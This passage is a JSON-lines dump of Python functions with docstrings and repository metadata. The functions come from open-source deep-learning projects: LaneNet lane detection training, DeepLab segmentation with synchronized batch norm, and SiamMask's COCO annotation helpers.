tf.train.AdamOptimizer(\n        learning_rate=self._learn_rate,\n    )\nelse:\n    raise NotImplementedError('Not support optimizer: {:s} for now'.format(self._optimizer_mode))\n\n# define distributed train op\nwith tf.variable_scope(tf.get_variable_scope()):\n    is_network_initialized = False\n    for i in range(self._gpu_nums):\n        with tf.device('/gpu:{:d}'.format(i)):\n            with tf.name_scope('tower_{:d}'.format(i)) as _:\n                input_images = self._input_src_image_list[i]\n                input_binary_labels = self._input_binary_label_image_list[i]\n                input_instance_labels = self._input_instance_label_image_list[i]\n                tmp_loss, tmp_grads = self._compute_net_gradients(\n                    input_images, input_binary_labels, input_instance_labels, optimizer,\n                    is_net_first_initialized=is_network_initialized\n                )\n                is_network_initialized = True\n\n                # Only use the mean and var in the chief gpu tower to update the parameter\n                if i == self._chief_gpu_index:\n                    batchnorm_updates = tf.get_collection(tf.GraphKeys.UPDATE_OPS)\n\n                tower_grads.append(tmp_grads)\n                tower_total_loss.append(tmp_loss['total_loss'])\n                tower_binary_seg_loss.append(tmp_loss['binary_seg_loss'])\n                tower_instance_seg_loss.append(tmp_loss['discriminative_loss'])\ngrads = self._average_gradients(tower_grads)\nself._loss = tf.reduce_mean(tower_total_loss, name='reduce_mean_tower_total_loss')\nself._binary_loss = tf.reduce_mean(tower_binary_seg_loss, name='reduce_mean_tower_binary_loss')\nself._instance_loss = tf.reduce_mean(tower_instance_seg_loss, name='reduce_mean_tower_instance_loss')\nret = self._val_model.compute_loss(\n    input_tensor=self._val_input_src_image,\n    binary_label=self._val_input_binary_label_image,\n    instance_label=self._val_input_instance_label_image,\n    name='LaneNet',\n    reuse=True\n)\nself._val_loss = ret['total_loss']\nself._val_binary_loss = ret['binary_seg_loss']\nself._val_instance_loss = ret['discriminative_loss']\n\n# define moving average op\nwith tf.variable_scope(name_or_scope='moving_avg'):\n    if self._cfg.TRAIN.FREEZE_BN.ENABLE:\n        train_var_list = [\n            v for v in tf.trainable_variables() if 'beta' not in v.name and 'gamma' not in v.name\n        ]\n    else:\n        train_var_list = tf.trainable_variables()\n    moving_ave_op = tf.train.ExponentialMovingAverage(self._moving_ave_decay).apply(\n        train_var_list + tf.moving_average_variables()\n    )\n    # define saver\n    self._loader = tf.train.Saver(tf.moving_average_variables())\n\n# group all the op needed for training\nbatchnorm_updates_op = tf.group(*batchnorm_updates)\napply_gradient_op = optimizer.apply_gradients(grads, global_step=self._global_step)\nself._train_op = tf.group(apply_gradient_op, moving_ave_op, batchnorm_updates_op)\n\n# define prediction\nself._binary_prediciton, self._instance_prediciton = self._model.inference(\n    input_tensor=self._input_src_image_list[self._chief_gpu_index],\n    name='LaneNet',\n    reuse=True\n)\nself._binary_prediciton = tf.identity(self._binary_prediciton, name='binary_segmentation_result')\nself._val_binary_prediction, self._val_instance_prediciton = self._val_model.inference(\n    input_tensor=self._val_input_src_image,\n    name='LaneNet',\n    reuse=True\n)\nself._val_binary_prediction = tf.identity(self._val_binary_prediction, name='val_binary_segmentation_result')\n\n# define miou\nif self._enable_miou:\n    with tf.variable_scope('miou'):\n        pred = tf.reshape(self._binary_prediciton, [-1, ])\n        gt = tf.reshape(self._input_binary_label_image_list[self._chief_gpu_index], [-1, ])\n        indices = tf.squeeze(tf.where(tf.less_equal(gt, self._cfg.DATASET.NUM_CLASSES - 1)), 1)\n        gt = tf.gather(gt, indices)\n        pred = tf.gather(pred, indices)\n        self._miou, self._miou_update_op = tf.metrics.mean_iou(\n            labels=gt,\n            predictions=pred,\n            num_classes=self._cfg.DATASET.NUM_CLASSES\n        )\n\n        val_pred = tf.reshape(self._val_binary_prediction, [-1, ])\n        val_gt = tf.reshape(self._val_input_binary_label_image, [-1, ])\n        indices = tf.squeeze(tf.where(tf.less_equal(val_gt, self._cfg.DATASET.NUM_CLASSES - 1)), 1)\n        val_gt = tf.gather(val_gt, indices)\n        val_pred = tf.gather(val_pred, indices)\n        self._val_miou, self._val_miou_update_op = tf.metrics.mean_iou(\n            labels=val_gt,\n            predictions=val_pred,\n            num_classes=self._cfg.DATASET.NUM_CLASSES\n        )\n\n# define saver and loader\nwith tf.variable_scope('loader_and_saver'):\n    self._net_var = [vv for vv in tf.global_variables() if 'lr' not in vv.name]\n    self._saver = tf.train.Saver(max_to_keep=10)\n\n# define summary\nwith tf.variable_scope('summary'):\n    summary_merge_list = [\n        tf.summary.scalar(\"learn_rate\", self._learn_rate),\n        tf.summary.scalar(\"total_loss\", self._loss),\n        tf.summary.scalar('binary_loss', self._binary_loss),\n        tf.summary.scalar('instance_loss', self._instance_loss),\n    ]\n    val_summary_merge_list = [\n        tf.summary.scalar('val_total_loss', self._val_loss),\n        tf.summary.scalar('val_binary_loss', self._val_binary_loss),\n        tf.summary.scalar('val_instance_loss', self._val_instance_loss),\n    ]\n    if self._enable_miou:\n        with tf.control_dependencies([self._miou_update_op]):\n            summary_merge_list_with_miou = [\n                tf.summary.scalar(\"learn_rate\", self._learn_rate),\n                tf.summary.scalar(\"total_loss\", self._loss),\n                tf.summary.scalar('binary_loss', self._binary_loss),\n                tf.summary.scalar('instance_loss', self._instance_loss),\n                tf.summary.scalar('miou', self._miou)\n            ]\n            self._write_summary_op_with_miou = tf.summary.merge(summary_merge_list_with_miou)\n        with tf.control_dependencies([self._val_miou_update_op, self._val_global_step_update]):\n            val_summary_merge_list_with_miou = [\n                tf.summary.scalar(\"total_loss\", self._loss),\n                tf.summary.scalar('binary_loss', self._binary_loss),\n                tf.summary.scalar('instance_loss', self._instance_loss),\n                tf.summary.scalar('val_miou', self._val_miou),\n            ]\n            self._val_write_summary_op_with_miou = tf.summary.merge(val_summary_merge_list_with_miou)\n    if ops.exists(self._tboard_save_dir):\n        shutil.rmtree(self._tboard_save_dir)\n    os.makedirs(self._tboard_save_dir, exist_ok=True)\n    model_params_file_save_path = ops.join(self._tboard_save_dir, self._cfg.TRAIN.MODEL_PARAMS_CONFIG_FILE_NAME)\n    with open(model_params_file_save_path, 'w', encoding='utf-8') as f_obj:\n        self._cfg.dump_to_json_file(f_obj)\n    self._write_summary_op = tf.summary.merge(summary_merge_list)\n    self._val_write_summary_op = tf.summary.merge(val_summary_merge_list)\n    self._summary_writer = tf.summary.FileWriter(self._tboard_save_dir, graph=self._sess.graph)\n\nLOG.info('Initialize tusimple lanenet multi gpu trainner complete')", "path": "lanenet-lane-detection/trainner/tusimple_lanenet_multi_gpu_trainner.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param onehot_labels:\n:param logits:\n:param classes_weights:\n:param gamma:\n:return:\n\"\"\"\n", "func_signal": "def _multi_category_focal_loss(cls, onehot_labels, logits, classes_weights, gamma=2.0):\n", "code": "epsilon = 1.e-7\nalpha = tf.multiply(onehot_labels, classes_weights)\nalpha = tf.cast(alpha, tf.float32)\ngamma = float(gamma)\ny_true = tf.cast(onehot_labels, tf.float32)\ny_pred = tf.nn.softmax(logits, dim=-1)\ny_pred = tf.clip_by_value(y_pred, epsilon, 1. - epsilon)\ny_t = tf.multiply(y_true, y_pred) + tf.multiply(1-y_true, 1-y_pred)\nce = -tf.log(y_t)\nweight = tf.pow(tf.subtract(1., y_t), gamma)\nfl = tf.multiply(tf.multiply(weight, ce), alpha)\nloss = tf.reduce_mean(fl)\n\nreturn loss", "path": "lanenet-lane-detection/lanenet_model/lanenet_back_end.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param warmup_steps:\n:param name:\n:return:\n\"\"\"\n", "func_signal": "def _compute_warmup_lr(self, warmup_steps, name):\n", "code": "with tf.variable_scope(name_or_scope=name):\n    factor = tf.math.pow(self._init_learning_rate / self._warmup_init_learning_rate, 1.0 / warmup_steps)\n    warmup_lr = self._warmup_init_learning_rate * tf.math.pow(factor, self._global_step)\nreturn warmup_lr", "path": "lanenet-lane-detection/trainner/tusimple_lanenet_multi_gpu_trainner.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\nThis generator returns all the parameters for the last layer of the net,\nwhich does the classification of pixel into classes\n\"\"\"\n", "func_signal": "def get_10x_lr_params(model):\n", "code": "b = [model.aspp1, model.aspp2, model.aspp3, model.aspp4, model.conv1, model.conv2, model.last_conv]\nfor j in range(len(b)):\n    for k in b[j].parameters():\n        if k.requires_grad:\n            yield k", "path": "pytorch-deeplab-xception/doc/deeplab_resnet.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nArgs:\n    master_callback: a callback to be invoked after having collected messages from slave devices.\n\"\"\"\n", "func_signal": "def __init__(self, master_callback):\n", "code": "self._master_callback = master_callback\nself._queue = queue.Queue()\nself._registry = collections.OrderedDict()\nself._activated = False", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/comm.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nThis generator returns all the parameters of the net except for\nthe last classification layer. Note that for each batchnorm layer,\nrequires_grad is set to False in deeplab_resnet.py, therefore this function does not return\nany batchnorm parameter\n\"\"\"\n", "func_signal": "def get_1x_lr_params(model):\n", "code": "b = [model.xception_features]\nfor i in range(len(b)):\n    for k in b[i].parameters():\n        if k.requires_grad:\n            yield k", "path": "pytorch-deeplab-xception/doc/deeplab_xception.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nThis generator returns all the parameters for the last layer of the net,\nwhich does the classification of pixel into classes\n\"\"\"\n", "func_signal": "def get_10x_lr_params(model):\n", "code": "b = [model.aspp1, model.aspp2, model.aspp3, model.aspp4, model.conv1, model.conv2, model.last_conv]\nfor j in range(len(b)):\n    for k in b[j].parameters():\n        if k.requires_grad:\n            yield k", "path": "pytorch-deeplab-xception/doc/deeplab_xception.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"Constructs a ResNet-101 model.\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def ResNet101(output_stride, BatchNorm, pretrained=True):\n", "code": "model = ResNet(Bottleneck, [3, 4, 23, 3], output_stride, BatchNorm, pretrained=pretrained)\nreturn model", "path": "pytorch-deeplab-xception/modeling/backbone/resnet.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"Load the mapping that associates pascal classes with label colors\nReturns:\n    np.ndarray with dimensions (21, 3)\n\"\"\"\n", "func_signal": "def get_pascal_labels():\n", "code": "return np.asarray([[0, 0, 0], [128, 0, 0], [0, 128, 0], [128, 128, 0],\n                   [0, 0, 128], [128, 0, 128], [0, 128, 128], [128, 128, 128],\n                   [64, 0, 0], [192, 0, 0], [64, 128, 0], [192, 128, 0],\n                   [64, 0, 128], [192, 0, 128], [64, 128, 128], [192, 128, 128],\n                   [0, 64, 0], [128, 64, 0], [0, 192, 0], [128, 192, 0],\n                   [0, 64, 128]])", "path": "pytorch-deeplab-xception/dataloaders/utils.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"Saves checkpoint to disk\"\"\"\n", "func_signal": "def save_checkpoint(self, state, is_best, filename='checkpoint.pth.tar'):\n", "code": "filename = os.path.join(self.experiment_dir, filename)\ntorch.save(state, filename)\nif is_best:\n    best_pred = state['best_pred']\n    with open(os.path.join(self.experiment_dir, 'best_pred.txt'), 'w') as f:\n        f.write(str(best_pred))\n    if self.runs:\n        previous_miou = [0.0]\n        for run in self.runs:\n            run_id = run.split('_')[-1]\n            path = os.path.join(self.directory, 'experiment_{}'.format(str(run_id)), 'best_pred.txt')\n            if os.path.exists(path):\n                with open(path, 'r') as f:\n                    miou = float(f.readline())\n                    previous_miou.append(miou)\n            else:\n                continue\n        max_miou = max(previous_miou)\n        if best_pred > max_miou:\n            shutil.copyfile(filename, os.path.join(self.directory, 'model_best.pth.tar'))\n    else:\n        shutil.copyfile(filename, os.path.join(self.directory, 'model_best.pth.tar'))", "path": "pytorch-deeplab-xception/utils/saver.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "# swap color axis because\n# numpy image: H x W x C\n# torch image: C X H X W\n", "func_signal": "def __call__(self, sample):\n", "code": "img = sample['image']\nmask = sample['label']\nimg = np.array(img).astype(np.float32).transpose((2, 0, 1))\nmask = np.array(mask).astype(np.float32)\n\nimg = torch.from_numpy(img).float()\nmask = torch.from_numpy(mask).float()\n\nreturn {'image': img,\n        'label': mask}", "path": "pytorch-deeplab-xception/dataloaders/custom_transforms.py", "commit_date": "2018-12-02 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nRegister an slave device.\nArgs:\n    identifier: an identifier, usually is the device id.\nReturns: a `SlavePipe` object which can be used to communicate with the master device.\n\"\"\"\n", "func_signal": "def register_slave(self, identifier):\n", "code": "if self._activated:\n    assert self._queue.empty(), 'Queue is not clean before next initialization.'\n    self._activated = False\n    self._registry.clear()\nfuture = FutureResult()\nself._registry[identifier] = _MasterRegistry(future)\nreturn SlavePipe(identifier, self._queue, future)", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/comm.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nThis generator returns all the parameters of the net except for\nthe last classification layer. Note that for each batchnorm layer,\nrequires_grad is set to False in deeplab_resnet.py, therefore this function does not return\nany batchnorm parameter\n\"\"\"\n", "func_signal": "def get_1x_lr_params(model):\n", "code": "b = [model.resnet_features]\nfor i in range(len(b)):\n    for k in b[i].parameters():\n        if k.requires_grad:\n            yield k", "path": "pytorch-deeplab-xception/doc/deeplab_resnet.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "# Entry flow\n", "func_signal": "def forward(self, x):\n", "code": "x = self.conv1(x)\nx = self.bn1(x)\nx = self.relu(x)\n\nx = self.conv2(x)\nx = self.bn2(x)\nx = self.relu(x)\n\nx = self.block1(x)\nlow_level_feat = x\nx = self.block2(x)\nx = self.block3(x)\n\n# Middle flow\nx = self.block4(x)\nx = self.block5(x)\nx = self.block6(x)\nx = self.block7(x)\nx = self.block8(x)\nx = self.block9(x)\nx = self.block10(x)\nx = self.block11(x)\nx = self.block12(x)\nx = self.block13(x)\nx = self.block14(x)\nx = self.block15(x)\nx = self.block16(x)\nx = self.block17(x)\nx = self.block18(x)\nx = self.block19(x)\n\n# Exit flow\nx = self.block20(x)\nx = self.conv3(x)\nx = self.bn3(x)\nx = self.relu(x)\n\nx = self.conv4(x)\nx = self.bn4(x)\nx = self.relu(x)\n\nx = self.conv5(x)\nx = self.bn5(x)\nx = self.relu(x)\n\nreturn x, low_level_feat", "path": "pytorch-deeplab-xception/doc/deeplab_xception.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "# Entry flow\n", "func_signal": "def forward(self, x):\n", "code": "x = self.conv1(x)\nx = self.bn1(x)\nx = self.relu(x)\n\nx = self.conv2(x)\nx = self.bn2(x)\nx = self.relu(x)\n\nx = self.block1(x)\n# add relu here\nx = self.relu(x)\nlow_level_feat = x\nx = self.block2(x)\nx = self.block3(x)\n\n# Middle flow\nx = self.block4(x)\nx = self.block5(x)\nx = self.block6(x)\nx = self.block7(x)\nx = self.block8(x)\nx = self.block9(x)\nx = self.block10(x)\nx = self.block11(x)\nx = self.block12(x)\nx = self.block13(x)\nx = self.block14(x)\nx = self.block15(x)\nx = self.block16(x)\nx = self.block17(x)\nx = self.block18(x)\nx = self.block19(x)\n\n# Exit flow\nx = self.block20(x)\nx = self.relu(x)\nx = self.conv3(x)\nx = self.bn3(x)\nx = self.relu(x)\n\nx = self.conv4(x)\nx = self.bn4(x)\nx = self.relu(x)\n\nx = self.conv5(x)\nx = self.bn5(x)\nx = self.relu(x)\n\nreturn x, low_level_feat", "path": "pytorch-deeplab-xception/modeling/backbone/xception.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nExecute an replication callback `__data_parallel_replicate__` on each module created by original replication.\nThe callback will be invoked with arguments `__data_parallel_replicate__(ctx, copy_id)`\nNote that, as all modules are isomorphism, we assign each sub-module with a context\n(shared among multiple copies of this module on different devices).\nThrough this context, different copies can share some information.\nWe guarantee that the callback on the master copy (the first copy) will be called ahead of calling the callback\nof any slave copies.\n\"\"\"\n", "func_signal": "def execute_replication_callbacks(modules):\n", "code": "master_copy = modules[0]\nnr_modules = len(list(master_copy.modules()))\nctxs = [CallbackContext() for _ in range(nr_modules)]\n\nfor i, module in enumerate(modules):\n    for j, m in enumerate(module.modules()):\n        if hasattr(m, '__data_parallel_replicate__'):\n            m.__data_parallel_replicate__(ctxs[j], i)", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/replicate.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nMonkey-patch an existing `DataParallel` object. Add the replication callback.\nUseful when you have customized `DataParallel` implementation.\nExamples:\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallel(sync_bn, device_ids=[0, 1])\n    > patch_replication_callback(sync_bn)\n    # this is equivalent to\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallelWithCallback(sync_bn, device_ids=[0, 1])\n\"\"\"\n\n", "func_signal": "def patch_replication_callback(data_parallel):\n", "code": "assert isinstance(data_parallel, DataParallel)\n\nold_replicate = data_parallel.replicate\n\n@functools.wraps(old_replicate)\ndef new_replicate(module, device_ids):\n    modules = old_replicate(module, device_ids)\n    execute_replication_callbacks(modules)\n    return modules\n\ndata_parallel.replicate = new_replicate", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/replicate.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nMain entry for the master device in each forward pass.\nThe messages were first collected from each devices (including the master device), and then\nan callback will be invoked to compute the message to be sent back to each devices\n(including the master device).\nArgs:\n    master_msg: the message that the master want to send to itself. This will be placed as the first\n    message when calling `master_callback`. For detailed usage, see `_SynchronizedBatchNorm` for an example.\nReturns: the message to be sent back to the master device.\n\"\"\"\n", "func_signal": "def run_master(self, master_msg):\n", "code": "self._activated = True\n\nintermediates = [(0, master_msg)]\nfor i in range(self.nr_slaves):\n    intermediates.append(self._queue.get())\n\nresults = self._master_callback(intermediates)\nassert results[0][0] == 0, 'The first result should belongs to the master.'\n\nfor i, res in results:\n    if i == 0:\n        continue\n    self._registry[i].result.put(res)\n\nfor i in range(self.nr_slaves):\n    assert self._queue.get() is True\n\nreturn results[0][1]", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/comm.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"Encode segmentation label images as pascal classes\nArgs:\n    mask (np.ndarray): raw segmentation label image of dimension\n      (M, N, 3), in which the Pascal classes are encoded as colours.\nReturns:\n    (np.ndarray): class map with dimensions (M,N), where the value at\n    a given location is the integer denoting the class index.\n\"\"\"\n", "func_signal": "def encode_segmap(mask):\n", "code": "mask = mask.astype(int)\nlabel_mask = np.zeros((mask.shape[0], mask.shape[1]), dtype=np.int16)\nfor ii, label in enumerate(get_pascal_labels()):\n    label_mask[np.where(np.all(mask == label, axis=-1))[:2]] = ii\nlabel_mask = label_mask.astype(int)\nreturn label_mask", "path": "pytorch-deeplab-xception/dataloaders/utils.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "# If it is not parallel computation or is in evaluation mode, use PyTorch's implementation.\n", "func_signal": "def forward(self, input):\n", "code": "if not (self._is_parallel and self.training):\n    return F.batch_norm(\n        input, self.running_mean, self.running_var, self.weight, self.bias,\n        self.training, self.momentum, self.eps)\n\n# Resize the input to (B, C, -1).\ninput_shape = input.size()\ninput = input.view(input.size(0), self.num_features, -1)\n\n# Compute the sum and square-sum.\nsum_size = input.size(0) * input.size(2)\ninput_sum = _sum_ft(input)\ninput_ssum = _sum_ft(input ** 2)\n\n# Reduce-and-broadcast the statistics.\nif self._parallel_id == 0:\n    mean, inv_std = self._sync_master.run_master(_ChildMessage(input_sum, input_ssum, sum_size))\nelse:\n    mean, inv_std = self._slave_pipe.run_slave(_ChildMessage(input_sum, input_ssum, sum_size))\n\n# Compute the output.\nif self.affine:\n    # MJY:: Fuse the multiplication for speed.\n    output = (input - _unsqueeze_ft(mean)) * _unsqueeze_ft(inv_std * self.weight) + _unsqueeze_ft(self.bias)\nelse:\n    output = (input - _unsqueeze_ft(mean)) * _unsqueeze_ft(inv_std)\n\n# Reshape it.\nreturn output.view(input_shape)", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/batchnorm.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"Compute the mean and standard-deviation with sum and square-sum. This method\nalso maintains the moving average on the master device.\"\"\"\n", "func_signal": "def _compute_mean_std(self, sum_, ssum, size):\n", "code": "assert size > 1, 'BatchNorm computes unbiased standard-deviation, which requires size > 1.'\nmean = sum_ / size\nsumvar = ssum - sum_ * mean\nunbias_var = sumvar / (size - 1)\nbias_var = sumvar / size\n\nself.running_mean = (1 - self.momentum) * self.running_mean + self.momentum * mean.data\nself.running_var = (1 - self.momentum) * self.running_var + self.momentum * unbias_var.data\n\nreturn mean, bias_var.clamp(self.eps) ** -0.5", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/batchnorm.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"Decode segmentation class labels into a color image\nArgs:\n    label_mask (np.ndarray): an (M,N) array of integer values denoting\n      the class label at each spatial location.\n    plot (bool, optional): whether to show the resulting color image\n      in a figure.\nReturns:\n    (np.ndarray, optional): the resulting decoded color image.\n\"\"\"\n", "func_signal": "def decode_segmap(label_mask, dataset, plot=False):\n", "code": "if dataset == 'pascal' or dataset == 'coco':\n    n_classes = 21\n    label_colours = get_pascal_labels()\nelif dataset == 'cityscapes':\n    n_classes = 19\n    label_colours = get_cityscapes_labels()\nelse:\n    raise NotImplementedError\n\nr = label_mask.copy()\ng = label_mask.copy()\nb = label_mask.copy()\nfor ll in range(0, n_classes):\n    r[label_mask == ll] = label_colours[ll, 0]\n    g[label_mask == ll] = label_colours[ll, 1]\n    b[label_mask == ll] = label_colours[ll, 2]\nrgb = np.zeros((label_mask.shape[0], label_mask.shape[1], 3))\nrgb[:, :, 0] = r / 255.0\nrgb[:, :, 1] = g / 255.0\nrgb[:, :, 2] = b / 255.0\nif plot:\n    plt.imshow(rgb)\n    plt.show()\nelse:\n    return rgb", "path": "pytorch-deeplab-xception/dataloaders/utils.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"Reduce the sum and square-sum, compute the statistics, and broadcast it.\"\"\"\n\n# Always using same \"device order\" makes the ReduceAdd operation faster.\n# Thanks to:: Tete Xiao (http://tetexiao.com/)\n", "func_signal": "def _data_parallel_master(self, intermediates):\n", "code": "intermediates = sorted(intermediates, key=lambda i: i[1].sum.get_device())\n\nto_reduce = [i[1][:2] for i in intermediates]\nto_reduce = [j for i in to_reduce for j in i]  # flatten\ntarget_gpus = [i[1].sum.get_device() for i in intermediates]\n\nsum_size = sum([i[1].sum_size for i in intermediates])\nsum_, ssum = ReduceAddCoalesced.apply(target_gpus[0], 2, *to_reduce)\nmean, inv_std = self._compute_mean_std(sum_, ssum, sum_size)\n\nbroadcasted = Broadcast.apply(target_gpus, mean, inv_std)\n\noutputs = []\nfor i, rec in enumerate(intermediates):\n    outputs.append((rec[0], _MasterMessage(*broadcasted[i * 2:i * 2 + 2])))\n\nreturn outputs", "path": "pytorch-deeplab-xception/modeling/sync_batchnorm/batchnorm.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "jfzhang95/pytorch-deeplab-xception", "stars": 2831, "license": "mit", "language": "python", "size": 939}
{"docstring": "\"\"\"\nGet ann ids that satisfy given filter conditions. default skips that filter\n:param imgIds  (int array)     : get anns for given imgs\n       catIds  (int array)     : get anns for given cats\n       areaRng (float array)   : get anns for given area range (e.g. [0 inf])\n       iscrowd (boolean)       : get anns for given crowd label (False or True)\n:return: ids (int array)       : integer array of ann ids\n\"\"\"\n", "func_signal": "def getAnnIds(self, imgIds=[], catIds=[], areaRng=[], iscrowd=None):\n", "code": "imgIds = imgIds if _isArrayLike(imgIds) else [imgIds]\ncatIds = catIds if _isArrayLike(catIds) else [catIds]\n\nif len(imgIds) == len(catIds) == len(areaRng) == 0:\n    anns = self.dataset['annotations']\nelse:\n    if not len(imgIds) == 0:\n        lists = [self.imgToAnns[imgId] for imgId in imgIds if imgId in self.imgToAnns]\n        anns = list(itertools.chain.from_iterable(lists))\n    else:\n        anns = self.dataset['annotations']\n    anns = anns if len(catIds)  == 0 else [ann for ann in anns if ann['category_id'] in catIds]\n    anns = anns if len(areaRng) == 0 else [ann for ann in anns if ann['area'] > areaRng[0] and ann['area'] < areaRng[1]]\nif not iscrowd == None:\n    ids = [ann['id'] for ann in anns if ann['iscrowd'] == iscrowd]\nelse:\n    ids = [ann['id'] for ann in anns]\nreturn ids", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "'''\nDownload COCO images from mscoco.org server.\n:param tarDir (str): COCO results directory name\n       imgIds (list): images to be downloaded\n:return:\n'''\n", "func_signal": "def download(self, tarDir = None, imgIds = [] ):\n", "code": "if tarDir is None:\n    print('Please specify target directory')\n    return -1\nif len(imgIds) == 0:\n    imgs = self.imgs.values()\nelse:\n    imgs = self.loadImgs(imgIds)\nN = len(imgs)\nif not os.path.exists(tarDir):\n    os.makedirs(tarDir)\nfor i, img in enumerate(imgs):\n    tic = time.time()\n    fname = os.path.join(tarDir, img['file_name'])\n    if not os.path.exists(fname):\n        urlretrieve(img['coco_url'], fname)\n    print('downloaded {}/{} images (t={:0.1f}s)'.format(i, N, time.time()- tic))", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "# create index\n", "func_signal": "def createIndex(self):\n", "code": "print('creating index...')\nanns, cats, imgs = {}, {}, {}\nimgToAnns,catToImgs = defaultdict(list),defaultdict(list)\nif 'annotations' in self.dataset:\n    for ann in self.dataset['annotations']:\n        imgToAnns[ann['image_id']].append(ann)\n        anns[ann['id']] = ann\n\nif 'images' in self.dataset:\n    for img in self.dataset['images']:\n        imgs[img['id']] = img\n\nif 'categories' in self.dataset:\n    for cat in self.dataset['categories']:\n        cats[cat['id']] = cat\n\nif 'annotations' in self.dataset and 'categories' in self.dataset:\n    for ann in self.dataset['annotations']:\n        catToImgs[ann['category_id']].append(ann['image_id'])\n\nprint('index created!')\n\n# create class members\nself.anns = anns\nself.imgToAnns = imgToAnns\nself.catToImgs = catToImgs\nself.imgs = imgs\nself.cats = cats", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying anns\n:return: anns (object array) : loaded ann objects\n\"\"\"\n", "func_signal": "def loadAnns(self, ids=[]):\n", "code": "if _isArrayLike(ids):\n    return [self.anns[id] for id in ids]\nelif type(ids) == int:\n    return [self.anns[ids]]", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
